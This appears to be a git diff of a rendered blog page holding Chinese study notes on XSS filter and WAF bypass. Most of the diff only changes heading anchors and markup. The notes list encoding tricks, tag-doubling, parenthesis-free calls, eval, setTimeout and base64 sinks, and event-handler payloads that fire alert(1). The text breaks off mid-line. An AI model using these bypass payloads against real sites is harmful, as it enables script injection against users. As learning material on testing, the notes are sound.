@@ -160,7 +160,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">XSS漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-XSS%E7%BB%95%E8%BF%87-%E2%80%93-%E6%A0%87%E7%AD%BE-%E5%B1%9E%E6%80%A7"><span class="nav-number">1.1.</span> <span class="nav-text">1. XSS绕过 – 标签&#x2F;属性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%BD%AC%E4%B9%89%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.1.</span> <span class="nav-text">1. 转义绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%B1%9E%E6%80%A7%E5%86%85%E5%AE%B9%E5%9B%9EHTML%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.2.</span> <span class="nav-text">2. 属性内容回HTML实体编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%B1%BB%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%E5%88%A0%E9%99%A4%E8%BF%87%E6%BB%A4"><span class="nav-number">1.1.3.</span> <span class="nav-text">3. 类双写绕过删除过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-fuzz%E8%BF%9B%E8%A1%8Cbypass-%E9%87%8D%E7%82%B9"><span class="nav-number">1.1.4.</span> <span class="nav-text">4. fuzz进行bypass(重点)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E5%B8%B8%E7%94%A8%E6%A0%87%E7%AD%BE%E5%92%8C%E5%B1%9E%E6%80%A7"><span class="nav-number">1.1.5.</span> <span class="nav-text">5. 常用标签和属性</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-XSS%E7%BB%95%E8%BF%87-%E2%80%93-JS%E6%8A%80%E5%B7%A7"><span class="nav-number">1.2.</span> <span class="nav-text">2. XSS绕过 – JS技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-unicode%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88%E4%B8%8D%E7%94%A8%E5%8A%A0%E5%BC%95%E5%8F%B7%EF%BC%89"><span class="nav-number">1.2.1.</span> <span class="nav-text">1. unicode编码绕过（不用加引号）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-JS8-ascii-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88%E9%9C%80%E8%A6%81%E5%8A%A0%E5%BC%95%E5%8F%B7%EF%BC%89"><span class="nav-number">1.2.2.</span> <span class="nav-text">2. JS8&#x2F;ascii 编码绕过（需要加引号）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%B9%B3%E6%9B%BFwindow%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%87%A0%E4%B8%AA%E5%85%A8%E5%B1%80%E5%87%BD%E6%95%B0"><span class="nav-number">1.2.3.</span> <span class="nav-text">3. 平替window对象的几个全局函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%97%A0%E6%8B%AC%E5%8F%B7%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0-%E6%8B%AC%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%97%B6%E4%BD%BF%E7%94%A8"><span class="nav-number">1.2.4.</span> <span class="nav-text">4. 无括号调用函数(括号被过滤时使用)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E4%BB%A3%E7%A0%81"><span class="nav-number">1.2.5.</span> <span class="nav-text">5. 字符串转代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-base64%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">1.2.6.</span> <span class="nav-text">6. base64过滤关键字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E5%BC%B1%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.2.7.</span> <span class="nav-text">7. 弱类型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5"><span class="nav-number">1.3.</span> <span class="nav-text">3. 特殊情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-payload"><span class="nav-number">1.4.</span> <span class="nav-text">XSS payload</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xss-lou-dong"><span class="nav-number">1.</span> <span class="nav-text">XSS漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-xss-rao-guo-biao-qian-shu-xing"><span class="nav-number">1.1.</span> <span class="nav-text">1. XSS绕过 – 标签&#x2F;属性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-zhuan-yi-rao-guo"><span class="nav-number">1.1.1.</span> <span class="nav-text">1. 转义绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-shu-xing-nei-rong-hui-html-shi-ti-bian-ma-rao-guo"><span class="nav-number">1.1.2.</span> <span class="nav-text">2. 属性内容回HTML实体编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-lei-shuang-xie-rao-guo-shan-chu-guo-lu"><span class="nav-number">1.1.3.</span> <span class="nav-text">3. 类双写绕过删除过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-em-strong-u-fuzz-jin-xing-bypass-zhong-dian-u-strong-em"><span class="nav-number">1.1.4.</span> <span class="nav-text">4. fuzz进行bypass(重点)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-chang-yong-biao-qian-he-shu-xing"><span class="nav-number">1.1.5.</span> <span class="nav-text">5. 常用标签和属性</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-xss-rao-guo-js-ji-qiao"><span class="nav-number">1.2.</span> <span class="nav-text">2. XSS绕过 – JS技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-unicode-bian-ma-rao-guo-bu-yong-jia-yin-hao"><span class="nav-number">1.2.1.</span> <span class="nav-text">1. unicode编码绕过（不用加引号）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-js-8-ascii-bian-ma-rao-guo-xu-yao-jia-yin-hao"><span class="nav-number">1.2.2.</span> <span class="nav-text">2. JS8&#x2F;ascii 编码绕过（需要加引号）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-ping-ti-window-dui-xiang-de-ji-ge-quan-ju-han-shu"><span class="nav-number">1.2.3.</span> <span class="nav-text">3. 平替window对象的几个全局函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-wu-gua-hao-diao-yong-han-shu-em-strong-gua-hao-bei-guo-lu-shi-shi-yong-strong-em"><span class="nav-number">1.2.4.</span> <span class="nav-text">4. 无括号调用函数(括号被过滤时使用)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-zi-fu-chuan-zhuan-dai-ma"><span class="nav-number">1.2.5.</span> <span class="nav-text">5. 字符串转代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-base-64-guo-lu-guan-jian-zi"><span class="nav-number">1.2.6.</span> <span class="nav-text">6. base64过滤关键字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-ruo-lei-xing"><span class="nav-number">1.2.7.</span> <span class="nav-text">7. 弱类型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-te-shu-qing-kuang"><span class="nav-number">1.3.</span> <span class="nav-text">3. 特殊情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss-payload"><span class="nav-number">1.4.</span> <span class="nav-text">XSS payload</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -301,94 +301,122 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><h2 id="1-XSS绕过-–-标签-属性"><a href="#1-XSS绕过-–-标签-属性" class="headerlink" title="1. XSS绕过 – 标签&#x2F;属性"></a>1. XSS绕过 – 标签&#x2F;属性</h2><h3 id="1-转义绕过"><a href="#1-转义绕过" class="headerlink" title="1. 转义绕过"></a>1. 转义绕过</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">    a</span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>这种简单标签无法解析，说明&lt;&gt;被html实体编码为 <code>&amp;lt</code>, <code>&amp;gt</code>, 可以尝试url编码(对&lt;和&gt;进行url编码)， 或url双编码</li>
+    <div class="post-body" itemprop="articleBody"><h1 id="xss-lou-dong">XSS漏洞</h1>
+<h2 id="1-xss-rao-guo-biao-qian-shu-xing" id="1-XSS绕过-–-标签-属性">1. XSS绕过 – 标签/属性</h2>
+<h3 id="1-zhuan-yi-rao-guo" id="1-转义绕过">1. 转义绕过</h3>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">    a</span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>这种简单标签无法解析，说明&lt;&gt;被html实体编码为 <code>&amp;lt</code>, <code>&amp;gt</code>, 可以尝试url编码(对&lt;和&gt;进行url编码)， 或url双编码</p>
+</li>
 </ul>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">name</span>=<span class="string">&quot;1234&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>value的值如果有特殊字符，就会被实体化，此时可用onfocus绕过</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">onfocus</span>=<span class="string">&quot;javascript:alert(1)&quot;</span> &#x27;&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="2-属性内容回HTML实体编码绕过"><a href="#2-属性内容回HTML实体编码绕过" class="headerlink" title="2. 属性内容回HTML实体编码绕过"></a>2. 属性内容回HTML实体编码绕过</h3><p><em>注意：实体编码只能属于*<em>属性内容</em></em>，也就是如下位置*</p>
+<h3 id="2-shu-xing-nei-rong-hui-html-shi-ti-bian-ma-rao-guo" id="2-属性内容回HTML实体编码绕过">2. 属性内容回HTML实体编码绕过</h3>
+<p><em>注意：实体编码只能属于<strong>属性内容</strong>，也就是如下位置</em></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>如果想要使用 <code>alert(1)</code> ,但是被拦截了，就可以用实体编码：</p>
 <ol>
-<li>先进行HTML实体编码</li>
-<li>再将html实体编码后的内容进行url编码（&amp;在url中会被识别为参数分隔符）</li>
+<li class="lvl-3">
+<p>先进行HTML实体编码</p>
+</li>
+<li class="lvl-3">
+<p>再将html实体编码后的内容进行url编码（&amp;在url中会被识别为参数分隔符）</p>
+</li>
 </ol>
-<h3 id="3-类双写绕过删除过滤"><a href="#3-类双写绕过删除过滤" class="headerlink" title="3. 类双写绕过删除过滤"></a>3. 类双写绕过删除过滤</h3><p>有的过滤是直接删除，可以用类双写绕过waf</p>
-<ul>
-<li>例如waf对，多个关键字进行了删除过滤<ul>
-<li><code>on&lt;script&gt;load=</code></li>
-<li>过滤删除<code>&lt;script&gt;</code>,剩下<code>onload</code></li>
+<h3 id="3-lei-shuang-xie-rao-guo-shan-chu-guo-lu" id="3-类双写绕过删除过滤">3. 类双写绕过删除过滤</h3>
+<p>有的过滤是直接删除，可以用类双写绕过waf</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>例如waf对，多个关键字进行了删除过滤</p>
+<ul class="lvl-2">
+<li class="lvl-4"><code>on&lt;script&gt;load=</code></li>
+<li class="lvl-4">过滤删除<code>&lt;script&gt;</code>,剩下<code>onload</code></li>
 </ul>
 </li>
 </ul>
-<h3 id="4-fuzz进行bypass-重点"><a href="#4-fuzz进行bypass-重点" class="headerlink" title="4. fuzz进行bypass(重点)"></a>4. <em><strong><u>fuzz进行bypass(重点)</u></strong></em></h3><p>使用burp爆破未检测的标签和属性</p>
+<h3 id="4-em-strong-u-fuzz-jin-xing-bypass-zhong-dian-u-strong-em" id="4-u-fuzz进行bypass-重点-u">4. <em><strong><u>fuzz进行bypass(重点)</u></strong></em></h3>
+<p>使用burp爆破未检测的标签和属性</p>
 <p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">Cross-Site Scripting (XSS) Cheat Sheet - 2024 Edition | Web Security Academy</a></p>
 <ol>
-<li>先跑可用属性</li>
-<li>再找对应标签来触发该属性</li>
+<li class="lvl-3">
+<p>先跑可用属性</p>
+</li>
+<li class="lvl-3">
+<p>再找对应标签来触发该属性</p>
+</li>
 </ol>
-<h3 id="5-常用标签和属性"><a href="#5-常用标签和属性" class="headerlink" title="5. 常用标签和属性"></a>5. 常用标签和属性</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://www.baidu.com/favicon.ico&quot;</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span>  <span class="comment">&lt;!-- dom 无法使用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;正常视频&quot;</span> <span class="attr">oncanplay</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span>  <span class="comment">&lt;!-- 自动聚焦到当前元素，导致执行--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">tabindex</span>=<span class="string">1</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">href</span>=<span class="string">1</span> &gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="2-XSS绕过-–-JS技巧"><a href="#2-XSS绕过-–-JS技巧" class="headerlink" title="2. XSS绕过 – JS技巧"></a>2. XSS绕过 – JS技巧</h2><p>如果可以绕过属性，标签，但是无法弹框或者跳转等方式被拦截，即 <code>alert()</code> 被拦截</p>
-<h3 id="1-unicode编码绕过（不用加引号）"><a href="#1-unicode编码绕过（不用加引号）" class="headerlink" title="1. unicode编码绕过（不用加引号）"></a>1. unicode编码绕过（不用加引号）</h3><p>js中的字母会自动进行unicode解码，可以用unicode绕过</p>
+<h3 id="5-chang-yong-biao-qian-he-shu-xing" id="5-常用标签和属性">5. 常用标签和属性</h3>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://www.baidu.com/favicon.ico&quot;</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span>  <span class="comment">&lt;!-- dom 无法使用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;正常视频&quot;</span> <span class="attr">oncanplay</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span>  <span class="comment">&lt;!-- 自动聚焦到当前元素，导致执行--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">tabindex</span>=<span class="string">1</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">href</span>=<span class="string">1</span> &gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="2-xss-rao-guo-js-ji-qiao" id="2-XSS绕过-–-JS技巧">2. XSS绕过 – JS技巧</h2>
+<p>如果可以绕过属性，标签，但是无法弹框或者跳转等方式被拦截，即 <code>alert()</code> 被拦截</p>
+<h3 id="1-unicode-bian-ma-rao-guo-bu-yong-jia-yin-hao" id="1-unicode编码绕过（不用加引号）">1. unicode编码绕过（不用加引号）</h3>
+<p>js中的字母会自动进行unicode解码，可以用unicode绕过</p>
 <p>alert(1) -&gt; \u0061\u006c\u0065\u0072\u0074(1)</p>
-<h3 id="2-JS8-ascii-编码绕过（需要加引号）"><a href="#2-JS8-ascii-编码绕过（需要加引号）" class="headerlink" title="2. JS8&#x2F;ascii 编码绕过（需要加引号）"></a>2. JS8&#x2F;ascii 编码绕过（需要加引号）</h3><p>JS中的字符串可以用 <code>JS8/ascii</code> 编码绕过关键字过滤</p>
+<h3 id="2-js-8-ascii-bian-ma-rao-guo-xu-yao-jia-yin-hao" id="2-JS8-ascii-编码绕过（需要加引号）">2. JS8/ascii 编码绕过（需要加引号）</h3>
+<p>JS中的字符串可以用 <code>JS8/ascii</code> 编码绕过关键字过滤</p>
 <p>ascii: alert(1) -&gt; \x61\x6C\x65\x72\x74</p>
 <p>js8:    alert(1) -&gt; \141\154\145\162\164\50\61\51</p>
-<h3 id="3-平替window对象的几个全局函数"><a href="#3-平替window对象的几个全局函数" class="headerlink" title="3. 平替window对象的几个全局函数"></a>3. 平替window对象的几个全局函数</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">alert</span>(<span class="number">1</span>) <span class="comment">//window指浏览器页面</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="title function_">alert</span>(<span class="number">1</span>)  <span class="comment">//this只想当前窗口</span></span><br><span class="line">parent.<span class="title function_">alert</span>(<span class="number">1</span>)  <span class="comment">//也可平替window对象</span></span><br><span class="line">self.<span class="title function_">alert</span>(<span class="number">1</span>)</span><br><span class="line">frames.<span class="title function_">alert</span>(<span class="number">1</span>)</span><br><span class="line">top.<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
+<h3 id="3-ping-ti-window-dui-xiang-de-ji-ge-quan-ju-han-shu" id="3-平替window对象的几个全局函数">3. 平替window对象的几个全局函数</h3>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">alert</span>(<span class="number">1</span>) <span class="comment">//window指浏览器页面</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="title function_">alert</span>(<span class="number">1</span>)  <span class="comment">//this只想当前窗口</span></span><br><span class="line">parent.<span class="title function_">alert</span>(<span class="number">1</span>)  <span class="comment">//也可平替window对象</span></span><br><span class="line">self.<span class="title function_">alert</span>(<span class="number">1</span>)</span><br><span class="line">frames.<span class="title function_">alert</span>(<span class="number">1</span>)</span><br><span class="line">top.<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
 <p>这些方式的作用</p>
 <p>JS中访问对象有多种方式：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">alert</span>(<span class="number">1</span>)  <span class="comment">//这样的alert(1)是代码，只能进行unicode编码</span></span><br><span class="line"><span class="variable language_">window</span>[<span class="string">&#x27;alert&#x27;</span>](<span class="number">1</span>)  <span class="comment">//这样的alert是字符串，可以进行JS8和ascii编码</span></span><br><span class="line"><span class="comment">//或者进行分割</span></span><br><span class="line"><span class="variable language_">window</span>[<span class="string">&#x27;ale&#x27;</span>+<span class="string">&#x27;rt&#x27;</span>](<span class="number">1</span>)</span><br><span class="line"><span class="comment">//或进行拼接</span></span><br><span class="line"><span class="variable language_">window</span>[<span class="string">&#x27;al&#x27;</span>.<span class="title function_">concat</span>(<span class="string">&#x27;ert&#x27;</span>)](<span class="number">1</span>)</span><br><span class="line"><span class="comment">//纯数字，利用ascii的10进制编码</span></span><br><span class="line"><span class="variable language_">window</span>[<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>)](<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-无括号调用函数-括号被过滤时使用"><a href="#4-无括号调用函数-括号被过滤时使用" class="headerlink" title="4. 无括号调用函数(括号被过滤时使用)"></a>4. 无括号调用函数(<em><strong>括号被过滤时使用</strong></em>)</h3><ol>
-<li><p>反引号</p>
+<h3 id="4-wu-gua-hao-diao-yong-han-shu-em-strong-gua-hao-bei-guo-lu-shi-shi-yong-strong-em" id="4-无括号调用函数-括号被过滤时使用">4. 无括号调用函数(<em><strong>括号被过滤时使用</strong></em>)</h3>
+<ol>
+<li class="lvl-3">
+<p>反引号</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`<span class="subst">$&#123;alert(<span class="number">1</span>)&#125;</span>`</span>  <span class="comment">//模板字符串</span></span><br><span class="line"><span class="comment">//延申用法</span></span><br><span class="line">alert <span class="string">`1`</span></span><br></pre></td></tr></table></figure>
 </li>
-<li><p>Symbol.hasInstanceof</p>
+<li class="lvl-3">
+<p>Symbol.hasInstanceof</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//需要引号</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;<span class="keyword">static</span> [<span class="title class_">Symbol</span>.<span class="property">hasInstance</span>]=<span class="built_in">eval</span>&#125;; <span class="string">&#x27;alert\x281\x29&#x27;</span> <span class="keyword">instanceof</span> A</span><br><span class="line"><span class="string">&#x27;alert\x281\x29&#x27;</span> <span class="keyword">instanceof</span> &#123;[<span class="title class_">Symbol</span>.<span class="property">hasInstance</span>]:<span class="built_in">eval</span>&#125;</span><br></pre></td></tr></table></figure>
-
-<p> <code>instanceof</code> 是运算符，用于判断左操作数是不是右操作数的实例    </p>
-<p><code>Symbol.hasInstance</code>指向一个函数, <code>eval</code>，用于自定义对象在<code>instanceof</code>运算时的行为，即指定使用哪个函数来检查左操作数是不是右操作数的实例    </p>
-<p>这里<code>Symbol.hasInstance</code>函数并没有指向函数，而是指向了 <code>eval</code> </p>
-<p>而 <code>eval</code> 是一个全局函数用于执行字符串中的 JavaScript 代码    </p>
-<p>即使用 <code>eval</code> 函数来检查 <code>alert(1)</code> 是否是有操作数的实例，自然就造成了弹框        </p>
-<p>这里的’’内的东西用的ascii，用JS8也可以</p>
+<p><code>instanceof</code> 是运算符，用于判断左操作数是不是右操作数的实例</p>
+<p><code>Symbol.hasInstance</code>指向一个函数, <code>eval</code>，用于自定义对象在<code>instanceof</code>运算时的行为，即指定使用哪个函数来检查左操作数是不是右操作数的实例</p>
+<p>这里<code>Symbol.hasInstance</code>函数并没有指向函数，而是指向了 <code>eval</code></p>
+<p>而 <code>eval</code> 是一个全局函数用于执行字符串中的 JavaScript 代码</p>
+<p>即使用 <code>eval</code> 函数来检查 <code>alert(1)</code> 是否是有操作数的实例，自然就造成了弹框</p>
+<p>这里的’'内的东西用的ascii，用JS8也可以</p>
 </li>
 </ol>
-<h3 id="5-字符串转代码"><a href="#5-字符串转代码" class="headerlink" title="5. 字符串转代码"></a>5. 字符串转代码</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="built_in">eval</span>					<span class="built_in">eval</span>(<span class="string">&quot;alert(1)&quot;</span>)</span><br><span class="line"><span class="number">2.</span> <span class="built_in">setTimeout</span>     <span class="built_in">setTimeout</span>(<span class="string">&quot;alert(1)&quot;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="number">3.</span> <span class="built_in">setInterval</span>      <span class="built_in">setInterval</span>(<span class="string">&quot;alert(1)&quot;</span>,<span class="number">999</span>)</span><br><span class="line"><span class="number">4.</span> 匿名函数          (<span class="function">()=&gt;</span>&#123;<span class="title function_">alert</span>(<span class="number">1</span>)&#125;)<span class="string">``</span>	</span><br><span class="line">							(<span class="function">()=&gt;</span>&#123;<span class="title function_">alert</span>(<span class="number">1</span>)&#125;)()</span><br><span class="line"><span class="number">5.</span> 署名函数          <span class="title class_">Function</span>(<span class="string">&quot;alert(1)&quot;</span>)<span class="string">``</span>	</span><br><span class="line">							<span class="title class_">Function</span>(<span class="string">&quot;alert(1)&quot;</span>)()</span><br><span class="line"><span class="number">6.</span> 原型链              <span class="string">&quot;&quot;</span>.<span class="property">at</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;alert(1)&quot;</span></span>)(<span class="params"></span>)	</span><br><span class="line">							<span class="string">&quot;&quot;</span>[<span class="string">&#x27;at&#x27;</span>][<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&quot;alert(1)&quot;</span>)()  <span class="comment">//可以换种方式访问对象，全部转化为字符串</span></span><br><span class="line"><span class="number">7.</span> <span class="title class_">Symbol</span>.<span class="property">hasInstanceof</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="6-base64过滤关键字"><a href="#6-base64过滤关键字" class="headerlink" title="6. base64过滤关键字"></a>6. base64过滤关键字</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">btoa</span>(<span class="string">&#x27;alert(1)&#x27;</span>)   <span class="comment">//编码</span></span><br><span class="line"><span class="title function_">atob</span>(<span class="string">&#x27;YWxlcnQoMSk=&#x27;</span>)   <span class="comment">//解码</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="title function_">atob</span>(<span class="string">&#x27;YWxlcnQoMSk=&#x27;</span>))</span><br></pre></td></tr></table></figure>
-
+<h3 id="5-zi-fu-chuan-zhuan-dai-ma" id="5-字符串转代码">5. 字符串转代码</h3>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="built_in">eval</span>					<span class="built_in">eval</span>(<span class="string">&quot;alert(1)&quot;</span>)</span><br><span class="line"><span class="number">2.</span> <span class="built_in">setTimeout</span>     <span class="built_in">setTimeout</span>(<span class="string">&quot;alert(1)&quot;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="number">3.</span> <span class="built_in">setInterval</span>      <span class="built_in">setInterval</span>(<span 